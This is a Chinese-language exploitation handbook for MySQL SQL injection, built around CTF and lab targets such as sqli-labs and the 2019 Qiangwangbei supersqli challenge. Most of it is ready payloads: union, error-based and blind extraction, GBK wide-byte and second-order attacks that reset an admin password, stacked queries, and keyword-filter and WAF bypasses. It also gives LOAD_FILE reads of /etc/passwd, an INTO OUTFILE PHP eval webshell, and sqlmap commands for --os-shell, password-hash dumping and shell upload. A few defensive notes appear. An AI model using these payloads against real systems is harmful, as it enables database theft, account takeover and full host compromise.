# EXP手册-SQL injection(MySQL)

## 一句话理解
MySQL 注入的本质，是攻击者让可控输入进入 SQL 语句的语法结构中，从而改变原查询逻辑，实现认证绕过、数据读取、盲注枚举、文件读写甚至进一步拿下主机。

## 常见危害
- 登录绕过、权限绕过
- 读取数据库结构和敏感数据
- 通过报错、布尔盲注、时间盲注做无回显利用
- 读取服务器文件
- 在具备条件时写文件、落 WebShell
- 与 WAF 绕过、Token 绕过、二次注入联动

## 常见注入类型
- Union 型注入
- 报错型注入
- Bool 型盲注
- 时间型盲注
- 堆叠查询与多语句利用（受驱动和配置影响）
- 二次注入

## 基础枚举语句
### 1. 查询数据库名

```sql
SELECT database();
SELECT schema_name FROM information_schema.schemata;
SELECT DISTINCT(db) FROM mysql.db;
```

### 2. 查询表名

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
```

### 3. 查询列名

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
```

## 常用常量与函数
- 当前用户：`user()`
- 查询版本：`version()`、`@@version`、`@@global.version`
- 查询主机名：`@@hostname`
- 查询安全目录：`@@global.secure_file_priv`

## 常见利用流程
### 1. 判断是否可控
先用最小探针确认参数是否进入 SQL 结构，例如：
- `'`
- `"`
- `and 1=1`
- `and 1=2`

### 2. 判断回显能力
区分：
- 直接回显
- 报错回显
- 无回显

### 3. 选择利用方式
通常顺序为：
1. Union 注入
2. 报错型注入
3. Bool 盲注
4. 时间盲注

## Union 注入
### 1. 判断字段数
常用 `ORDER BY`：

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

不断增加直到报错，即可推测原查询字段数。

### 2. 寻找输出位
通过 `UNION SELECT 1,2,3...` 判断哪些字段会显示在页面中。

### 3. 构造利用
示例：

```sql
SELECT username, password, permission FROM Users WHERE id = '1';
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
```

若 `ORDER BY 4` 报错，说明字段数为 3。

进一步利用：

```sql
-1' UNION SELECT 1,2,3--+
-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
```

## 报错型注入
适合“页面不直接显示查询结果，但会返回数据库错误信息”的场景。

常见报错函数或思路：
- `floor(rand())`
- `extractvalue()`
- `updatexml()`
- 几何函数
- `exp()`
- `GTID_SUBSET()`
- `GTID_SUBTRACT()`
- `ST_LatFromGeoHash()`
- `ST_LongFromGeoHash()`
- `ST_PointFromGeoHash()`

### 1. `floor(rand())` 方式

```sql
select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
```

利用分组和随机数重复导致的报错把数据带出来。

### 2. `extractvalue()` / `updatexml()`
这两个 XML 相关函数在很多历史版本里是高频报错利用点：

```sql
select * from mysql.user where user = 'root' and extractvalue(1,concat(0x5c,user()));
select * from mysql.user where user = 'root' and updatexml(1,concat(0x5c,user()),1);
```

若 `concat` 被过滤，可尝试替代：

```sql
select * from mysql.user where user = 'root' and extractvalue(1,make_set(3,'~',version()));
select * from mysql.user where user = 'root' and extractvalue(1,lpad((version()),20,'@'));
```

### 3. 几何函数

```sql
select multipoint((select * from (select * from (select * from (select version())a)b)c));
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
```

### 4. 数值溢出
适用于部分版本：

```sql
select exp(~(select * from(select user())x));
```

### 5. 数据重复

```sql
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```

### 6. MySQL 5.7 部分函数

```sql
select ST_LatFromGeoHash(version());
select ST_LongFromGeoHash(version());
select GTID_SUBSET(version(),1);
select GTID_SUBTRACT(version(),1);
select ST_PointFromGeoHash(version(),1);
```

## Bool 型盲注
### 1. 判断语句真假

```sql
and 1=1
and 1=2
```

### 2. 按字符枚举

```sql
AND ascii((SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)) = ascii('A')
```

适用于无报错、无直接回显，但页面真假状态可观察的场景。

## 时间型盲注
### 1. 时间探针

```sql
and sleep(5)
```

### 2. 条件判断

```sql
and if((select ord(substring(database(),1,1))) = 97,sleep(5),1)
```

常见写法：

```sql
if((condition), sleep(5), 0)
CASE WHEN (condition) THEN sleep(5) ELSE 0 END
sleep(5*(condition))
```

## 宽字节注入（GBK）
### 1. 成因
PHP 端使用 `addslashes()` / `mysql_real_escape_string()` 对输入转义时，会把 `'` 转成 `\'`（即 `%5C%27`）。
当 MySQL 连接字符集为 GBK / GB2312 / BIG5 等多字节编码时，攻击者提交 `%df'`：

```text
原始输入     %df'                 →  %df %27
addslashes   %df\'                →  %df %5c %27
GBK 解码     [運] + '             →  %df%5c 组成合法双字节汉字，反斜杠被"吃掉"
结果         单引号逃逸，成功闭合原查询
```

原理要点：
- GBK 首字节范围 `0x81~0xFE`，第二字节范围 `0x40~0xFE`（不含 `0x7F`）
- `%5c`（`\`）恰好落在第二字节区间，因此任何 `0x81~0xFE` 开头的字节 + `%5c` 都构成一个合法 GBK 字符
- 常用首字节：`%df`（最经典）、`%bf`、`%a1`、`%aa`

### 2. 判断是否存在
```text
?id=1'        → 无报错（被安全转义成字符串，说明有转义）
?id=1%df'     → 报错 / 成功闭合 → 存在宽字节注入
```

`SET NAMES gbk` 与 `mysql_set_charset('gbk')` 的区别：
- `SET NAMES gbk`：只改变服务端连接字符集，不通知客户端驱动，PHP 的转义函数仍按单字节处理 → 转义失效，宽字节注入仍存在
- `mysql_set_charset('gbk')`：让驱动感知当前字符集，`mysql_real_escape_string` 能正确处理多字节序列 → 安全

### 3. payload
```sql
-- 基本判断 + union
?id=1%df' and 1=2 union select 1,2,3--+

-- 直接取数据
?id=-1%df' union select 1,user(),database()--+

-- 配合报错
?id=1%df' and updatexml(1,concat(0x7e,database()),1)--+
```

### 4. 防御
- 连接层直接指定 `utf8mb4`（单字节安全编码），从根源消除多字节转义歧义
- 必须使用 GBK 时：`mysql_set_charset('gbk')`（而非 `SET NAMES`）+ 预处理语句
- 最优解：PDO / mysqli 预处理，参数与 SQL 结构分离，转义问题不复存在

## 二次注入（Second-order）
### 1. 原理
- 入库时：程序对输入做了转义（`addslashes` / 预处理），恶意 payload 以原始形式存入数据库
- 出库时：程序从数据库取出数据，误以为"库里的数据是可信的"，不加转义直接拼进新的 SQL 语句 → 注入触发

关键认知：转义只保证"入库时语法不出错"，数据库中保存的是去掉转义符的原始文本；是否安全取决于出库后是否再次参数化，而不是"数据已经过转义"。

### 2. 经典场景
注册用户名为 `admin'-- -`：
1. 注册时被转义为 `admin\'-- -` 入库，库中实际存储 `admin'-- -`
2. 修改密码时，程序把 session 中的用户名直接拼进 UPDATE：

```sql
UPDATE users SET password='123456' WHERE username='admin'-- -' AND password='old'
```

`-- -` 把后半段密码校验注释掉，实际修改的是 admin 的密码。

### 3. 完整案例（PHP 代码）
register.php（入库，转义正确但存入恶意原文）：

```php
<?php
// register.php —— 注册：转义后入库，数据库里保存的是原始注入语句
include 'conn.php';
$username = addslashes($_POST['username']);   // 转义：admin'-- - → admin\'-- -
$password = addslashes($_POST['password']);
// INSERT 语法正确，但数据库实际存储 admin'-- -（转义反斜杠不会入库）
$sql = "INSERT INTO users(username, password) VALUES('$username','$password')";
mysqli_query($conn, $sql);
?>
```

changepwd.php（出库拼接，二次注入触发点）：

```php
<?php
// changepwd.php —— 修改密码：从库里取出用户名，未转义直接拼接 → 注入触发
include 'conn.php';
$username = $_SESSION['username'];            // 出库值 admin'-- -，被误认为可信数据
$newpwd   = addslashes($_POST['newpwd']);
// 直接拼接：WHERE username='admin'-- -' AND ... → 注释生效，改掉 admin 的密码
$sql = "UPDATE users SET password='$newpwd' WHERE username='$username' AND password='" . addslashes($_POST['oldpwd']) . "'";
mysqli_query($conn, $sql);
?>
```

利用步骤：
1. 注册用户名 `admin'-- -`（或 `admin'#`），密码任意
2. 以该账号登录（`$_SESSION['username']` 取出的就是带注入语法的原文）
3. 进入修改密码页，提交新密码
4. 实际执行的 UPDATE 只修改了 admin 的密码
5. 登出后用 admin + 新密码登录，获得更高权限

### 4. sqli-labs Less-24 指引
- 关卡为 POST 登录框（login.php）+ 注册页（logged-in.php）+ 修改密码页（pass_change.php）
- 步骤：
  1. 注册页创建用户 `admin'#`，密码 `123456`
  2. 用 `admin'#` / `123456` 登录
  3. 进入修改密码页，把密码重置为 `hack123`
  4. 实际 UPDATE 变成 `... WHERE username='admin'#' AND password=...` → admin 密码被改为 hack123
  5. 登出，用 admin / hack123 登录成功，进入管理员界面拿到出口

## 堆叠注入与预处理
### 1. 前提条件
堆叠注入指在一条注入中用 `;` 追加执行多条 SQL，是否可行取决于驱动与配置：
- PHP `mysqli_multi_query()`：支持一次提交多条语句 → 可堆叠
- PHP `mysqli_query()` / `mysql_query()`：单语句接口 → 不可堆叠
- PDO：`PDO::ATTR_EMULATE_PREPARES = true`（默认，模拟预处理）时支持多语句；设为 `false`（真预处理）则不可堆叠
- Java JDBC：默认 `allowMultiQueries=false`，需连接串开启才可堆叠

### 2. 堆叠 payload
```sql
?id=1';insert into users values(6,'test','test')-- -
?id=1';update users set password='hacked' where username='admin'-- -
?id=1';show tables-- -
?id=1';select sleep(5)-- -
```

### 3. 强网杯 2019 supersqli 案例简述
- 输入 `1'` 报错 → 单引号闭合；输入 `1';show tables;#` 正常回显两张表 → 堆叠可行
- 常见的 `'||(select ...) ||'` 逻辑或盲注套路在本题行不通：题目用 `preg_match` 大小写不敏感地过滤了 `select|update|delete|drop|insert|where|.`，`select` 关键字本身被拦截
- 只能绕过关键字过滤：预处理 + `concat` 拆词，或 `handler` 读表（见下）

### 4. 预处理绕过（关键字被过滤时）
错误示范（常见误区）：

```sql
prepare p from 'sel'+'ect * from t';
-- 错误：PREPARE 的语句源只能是字符串字面量或用户变量，
-- 'sel'+'ect ...' 会按数值加法求值（'sel' 转 0），结果为 0 而非拼接后的字符串
```

正确形式（用户变量 + `concat` 拼接）：

```sql
set @sql = concat('sel','ect * from `1919810931114514`');  -- 关键字拆开后在变量内拼接
prepare stmt from @sql;                                     -- 预处理语句源是用户变量，绕过 select 过滤
execute stmt;                                               -- 执行
```

完整 URL 形式（supersqli）：

```text
?id=1';set @sql=concat('sel','ect * from `1919810931114514`');prepare stmt from @sql;execute stmt;-- -
```

### 5. handler 语句读表（绕过 select 的利器）
`handler` 是独立于 `select` 的表读取语法，完全不出现 select 关键字：

```sql
handler `1919810931114514` open as t;   -- 打开表并取别名 t
handler t read first;                   -- 读第一行
handler t read next;                    -- 依次读下一行
```

URL 形式：

```text
?id=1';handler `1919810931114514` open as t;handler t read first;-- -
```

## 文件读写
### 1. 利用前提
一般需要 `FILE` 权限，且受到 `secure_file_priv` 限制。

### 2. 查询权限

```sql
SELECT @@secure_file_priv;
SELECT file_priv FROM mysql.user WHERE user = 'username';
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';
```

说明：
- MySQL `>= 5.5.53` 常见情况是 `NULL`，表示禁止导入导出
- MySQL `< 5.5.53` 为空时往往限制更少

### 3. 读文件

```sql
SELECT LOAD_FILE('/etc/passwd');
```

注意点：
- MySQL 账户需要对文件有读取权限
- 文件大小受 `max_allowed_packet` 限制
- `LOAD_FILE()` 并非对所有路径都可用

### 4. 写文件
常用：
- `INTO OUTFILE`
- `INTO DUMPFILE`

示例：

```sql
SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
```

拼接写文件示例：

```sql
admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-' LINES TERMINATED BY '<?phpinfo();?>'---
```

- [Mysql 写入 Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)

## 常用技巧
### 1. 多行合并一行
#### `concat()`

```sql
select concat(id,0x7e,name) as c from a limit 1;
```

#### `concat_ws()`

```sql
select concat_ws('_',id,name) as c from a limit 1;
```

#### `group_concat()`

```sql
select group_concat(name) as name from a;
```

### 2. 截取字符串
常用：
- `left()`
- `right()`
- `substring()`
- `substring_index()`

示例：

```sql
SELECT LEFT('web-exp-mysql',6);
SELECT RIGHT('web-exp-mysql',6);
SELECT SUBSTRING('web-exp-mysql', 3);
SELECT SUBSTRING_INDEX('web-exp-mysql', '-', 2);
SELECT SUBSTRING_INDEX('web-exp-mysql', '.', -2);
```

## 常见绕过思路
### 1. WAF 绕过
- [sql-injection-fuck-waf](https://notwhy.github.io/2018/06/sql-injection-fuck-waf/)

### 2. 过滤函数绕过
若目标过滤以下关键字或字符：

```text
gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`
```

则可尝试：
- 大小写变形
- 编码变形
- 函数替换
- 运算替换
- 无空格构造
- 布尔表达式拼接

原文保留示例：

```sql
'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')
```

### 3. Token 保护绕过
对存在动态 Token 的接口，可借助自动化联动工具处理。

- [Burpsuite+SQLMAP 双璧合一绕过 Token 保护的应用进行注入攻击](https://www.freebuf.com/sectool/128589.html)

## MySQL 8 差异（注入视角）
### 1. 服务端变化速览
- 默认字符集改为 `utf8mb4`：宽字节注入（GBK）的生存空间大幅缩小，utf8 系编码下 `%df` 吃反斜杠不成立
- 默认认证插件改为 `caching_sha2_password`：老客户端/驱动直接连不上；拿下 `mysql.user` 表后，密码哈希不再是裸 `mysql_native_password` 的 SHA1 双重加盐结构，离线破解成本不同
- sql_mode 移除 `NO_AUTO_CREATE_USER`：`GRANT` 不再能隐式创建用户，靠 grant 语句建号的后渗透思路失效
- `information_schema` 改为数据字典表实现：`tables` / `columns` / `schemata` 依旧可查，常规枚举手法不变

### 2. 报错注入可用性变化
- `floor(rand(0)*2) group by` 经典报错在 8.0 中已被官方修复，不可用
- `updatexml()` / `extractvalue()` 在 8.0 仍可触发 XPATH 报错，双括号嵌套写法稳定：

```sql
select updatexml(1,concat(0x7e,((select group_concat(table_name) from information_schema.tables where table_schema=database()))),1);
select extractvalue(1,concat(0x7e,((select user()))));
```

双括号 `((select ...))` 的作用：把子查询包成标准标量子查询，规避 8.0 对部分上下文语法的收紧，报错依旧可用。

### 3. REGEXP / RLIKE 替代 like
`like` 被过滤或场景受限时用正则替代：

```sql
select table_name from information_schema.tables where table_schema regexp '^ctf';
select * from users where username rlike '^adm';

-- 逐字符枚举（配合 binary 保证大小写敏感）
select 'flag' regexp binary '^f';
select * from users where username regexp binary '^a[a-b]';
```

### 4. 窗口函数 row_number() over() 逐行取数
`limit` 被过滤、或子查询内直接 `limit` 报 `LIMIT & IN/ALL/ANY/SOME subquery` 错误时的替代方案：

```sql
-- 派生表 + 行号：改 rn=1/2/3... 即可逐行枚举，无需 limit
select * from (select username,row_number() over() as rn from users) t where rn=2;

-- 配合注入点（报错带出第 N 行）
and updatexml(1,concat(0x7e,(select username from (select username,row_number() over() as rn from users) t where rn=1)),1)

-- 传统解法（套一层派生表后 limit 可用），可与之对比记忆
and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1) t)),1)
```

### 5. CTE（with 语句）
8.0 支持公共表表达式，可用于绕过"只匹配语句开头是 select"的检测：

```sql
with cte as (select user() as u) select * from cte;   -- select 不在语句首位
```

## sqlmap 实战用法
### 1. 基础参数表

| 参数 | 作用 | 示例 |
|---|---|---|
| `-u` | 指定 GET 目标 URL | `sqlmap -u "http://x/?id=1"` |
| `-r` | 加载请求文件（Burp 抓包保存） | `sqlmap -r request.txt` |
| `--batch` | 全部交互用默认选项，免手动确认 | `sqlmap -u "..." --batch` |
| `--dbs` | 枚举所有数据库 | `sqlmap -u "..." --dbs` |
| `--tables` / `-D` | 指定库枚举表 | `sqlmap -u "..." -D ctf --tables` |
| `--dump` / `-T` / `-C` | 导出指定表/列数据 | `sqlmap -u "..." -D ctf -T users -C username,password --dump` |
| `--current-db` / `--current-user` | 当前库 / 当前用户 | `sqlmap -u "..." --current-db` |

### 2. 指定注入点
- `-p` 指定测试参数：

```bash
sqlmap -u "http://x/?id=1&name=a" -p id
sqlmap -u "http://x/?id=1&name=a" -p "id,name"
```

- `*` 标记强制测试任意位置（伪静态路径、非标准参数值都适用）：

```bash
sqlmap -u "http://x/news/1*/detail"                 # 路径中标记
sqlmap -u "http://x/?id=1*&uid=2*"                  # 多位置并行测试
sqlmap -r request.txt                                # 也可在请求文件内对应值后加 *
```

- Header 注入（需 `--level>=3` 才测 Header/Cookie）：

```bash
sqlmap -u "http://x/" --headers="X-Forwarded-For: 1*" --level=3
```

### 3. 绕 WAF

```bash
sqlmap -u "http://x/?id=1" --tamper=space2comment,between --random-agent --delay=1 --proxy="http://127.0.0.1:8080"
```

- `--tamper`：tamper 脚本链（逗号分隔多个），`sqlmap --list-tampers` 查看全部
- `--random-agent`：每个请求随机 UA
- `--delay=1`：请求间隔 1 秒，降低触发频率类拦截的概率
- `--proxy`：让流量过代理（配合 Burp 实时观察拦截行为）
- 常用 tamper：`space2comment`（空格→`/**/`）、`between`（`>`→`NOT BETWEEN`）、`randomcase`（随机大小写）、`charencode`、`equaltolike`

### 4. 高级利用

```bash
sqlmap -u "http://x/?id=1" --os-shell                              # 获取系统 shell（需 DBA + 可写目录）
sqlmap -u "http://x/?id=1" --file-read="/etc/passwd"               # 读服务器文件
sqlmap -u "http://x/?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"   # 写文件
sqlmap -u "http://x/?id=1" --level=3 --risk=2                      # 提高检测等级（level3 测 Header/Cookie，risk2 加 OR 型）
sqlmap -u "http://x/?id=1" --technique=BEUSTQ                      # 指定注入类型：B=布尔 E=报错 U=union S=堆叠 T=时间 Q=内联查询
sqlmap -u "http://x/?id=1" --is-dba --privileges                   # 是否 DBA、权限列表
sqlmap -u "http://x/?id=1" --passwords                             # 拖 mysql.user 密码哈希并尝试破解
```

### 5. 配合 Burp
1. Burp 抓包 → 保存完整原始请求（含请求行、Header、POST body）为 `request.txt`
2. 直接测试：`sqlmap -r request.txt`
3. 动态 Token 页面（每次请求 token 变化导致会话失效）：

```bash
sqlmap -r request.txt --csrf-token="token" --csrf-url="http://x/get_token.php"
```

- `--csrf-token`：指定 token 参数名
- `--csrf-url`：指定每次请求前从哪个页面刷新 token
4. 联调观察：`--proxy="http://127.0.0.1:8080"` 把 sqlmap 流量导入 Burp，实时看 WAF 拦截细节、微调 tamper

## 靶场与案例
### 1. sqli-labs Less 1-75 分类清单
原版为 Less-1 ~ Less-65，部分发行版/魔改版扩展到 75+，后段均为前述类型的组合变体：

- Less-1~4：GET-union 注入（单引号 / 整型 / 双引号 / 括号闭合四连）
- Less-5~6：GET-双查询（报错/盲注，无直接回显）
- Less-7：GET-文件写入（`into outfile`）
- Less-8~10：GET-布尔盲注（8）、时间盲注（9/10）
- Less-11~16：POST 登录框注入（单引号/双引号/括号 + 报错/布尔变体）
- Less-17：POST-UPDATE 报错注入（修改密码参数处）
- Less-18~20：HTTP Header 注入（User-Agent / Referer / Cookie）
- Less-21~22：Cookie 注入 + Base64 编码
- Less-23：过滤注释符（用 `' and '1'='1` 手工闭合绕过）
- Less-24：二次注入（注册 → 登录 → 改密码完整链路）
- Less-25~25a：过滤 and/or（双写 `anandd`/`oorr`、`&&`/`||` 绕过）
- Less-26~26a：过滤空格/注释（`%a0`、`%0b`、括号包裹绕过）
- Less-27~27a：过滤 union/select（大小写混写、双写 `ununionion` 绕过）
- Less-28~28a：过滤 union select 组合
- Less-29~31：WAF/参数污染（HPP 双参数 + jsp 多请求思路）
- Less-32~33：宽字节注入（addslashes + GBK，GET）
- Less-34~35：宽字节 POST / 整型变体
- Less-36~37：宽字节（mysql_real_escape_string）变体
- Less-38~41：GET 堆叠注入（`mysqli_multi_query`）
- Less-42~45：POST 堆叠注入（登录框 / 改密码）
- Less-46~49：ORDER BY 注入（排序参数：报错/布尔/时间）
- Less-50~53：ORDER BY + 堆叠
- Less-54~57：挑战关（限查询次数，union/盲注）
- Less-58~61：挑战关（报错 / 整型变体）
- Less-62~63：挑战关（布尔 / 时间盲注）
- Less-64~65：挑战关（堆叠 / 双括号闭合）
- Less-66~75（扩展版）：上述类型的闭合方式、Base64、宽字节等组合变体——先判断闭合方式，再套用对应手法

### 2. 强网杯 2019 supersqli 完整题解
题目背景：输入 id 查询成绩，后端用 `preg_match` 大小写不敏感过滤 `select|update|delete|drop|insert|where|\.`。

第一步：判断闭合与堆叠可行性

```text
1'        → 报错 near ''' at line 1 → 单引号闭合
1'#       → 正常回显
1';show tables;#   → 回显两张表：1919810931114514、words → 堆叠注入可行
```

第二步：查看目标表结构

```text
1';show columns from `1919810931114514`;#
→ 发现 flag 列（表名为纯数字，必须用反引号包裹）
```

第三步：`select` 被过滤，两条路拿数据

路 A：预处理 + concat 拆关键字

```text
1';set @sql=concat('sel','ect * from `1919810931114514`');prepare stmt from @sql;execute stmt;#
```

路 B：handler 读表（不出现任何被过滤关键字）

```text
1';handler `1919810931114514` open as t;handler t read first;#
```

第四步：回显中拿到 flag。

坑点小结：
- 表名纯数字 → 必须 `` `1919810931114514` `` 反引号包裹
- `.` 被过滤 → payload 中不能出现点号（`-- -` 不受影响，但 `information_schema.tables` 这类带点写法会死）
- `where` 被过滤 → `show columns` 不受影响，可正常看结构

### 3. 一道 CTF 注入题完整流程（fuzz → dump 模板）
以"登录框 + 无直接回显 + 有 WAF"的典型题为例。

第一步：定位注入点与闭合方式

```text
admin'              → 页面报错/异常 → 单引号闭合
admin"              → 无异常 → 不是双引号
admin' and '1'='1   → 正常
admin' and '1'='2   → 异常 → 布尔状态可区分
```

第二步：fuzz 过滤规则（Burp Intruder + 字典逐个试）

```text
union select        → 被拦
UNION SELECT        → 被拦（大小写不敏感）
ununionion select   → 通过 → 存在双写绕过
空格                → 被拦 → 试 /**/、%09、%0a、+
and / or            → 被拦 → 试 &&、||、双写
sleep               → 被拦 → 试 benchmark、get_lock
```

第三步：确定回显通道（按优先级降级）

```sql
-- 直接回显：无
-- 报错通道：
admin' and updatexml(1,concat(0x7e,database()),1)-- -
-- 报错被吞 → 布尔盲注：
admin' and (ascii(substr(database(),1,1))>100)-- -
-- 布尔不可分 → 时间盲注：
admin' and if(ascii(substr(database(),1,1))>100,sleep(3),0)-- -
```

第四步：枚举库/表/列

```sql
admin' and updatexml(1,concat(0x7e,(select database())),1)-- +
admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)-- +
admin' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag_table')),1)-- +
```

第五步：dump flag

```sql
admin' and updatexml(1,concat(0x7e,(select group_concat(flag) from flag_table)),1)-- +
```

- 报错回显约 32 字符限制 → 用 `substr(...,1,30)`、`substr(...,31,30)` 分段取，`0x7e` 作分隔标记
- 手工太慢时切 sqlmap：请求存 request.txt → `sqlmap -r request.txt --batch --technique=B -D ctf -T flag_table --dump`

第六步：验证与收尾
- 检查 flag 完整性（分段拼接是否遗漏）
- 全程低噪音：优先报错 > 布尔 > 时间，避免 sleep 打太多触发封禁或超出题目的请求次数限制

## 实战排查思路
- 先判断闭合方式和注入位置
- 先争取直接回显，再退到报错型、布尔盲注、时间盲注
- 先枚举数据库、表、列，再根据权限评估文件读写
- 结合业务看是否能登录绕过、越权或做二次注入
- 关注驱动差异、多语句支持、WAF 和 Token 机制

## 速查清单
- 先探测：引号、布尔、时间
- 再判断：Union、报错、盲注哪条路最短
- 枚举：库、表、列、用户、版本、主机名
- 检查：`FILE` 权限、`secure_file_priv`、可读写路径
- 结合：WAF、Token、二次注入、文件写入

## Reference
- https://www.cnblogs.com/xuyangda/p/14510562.html
- https://www.anquanke.com/post/id/266244
- https://www.freebuf.com/sectool/128589.html
- https://github.com/sqlmapproject/sqlmap/wiki/Usage （sqlmap 官方 wiki，全参数用法）
- https://github.com/Audi-1/sqli-labs （sqli-labs 官方仓库，靶场搭建与关卡源码）
  
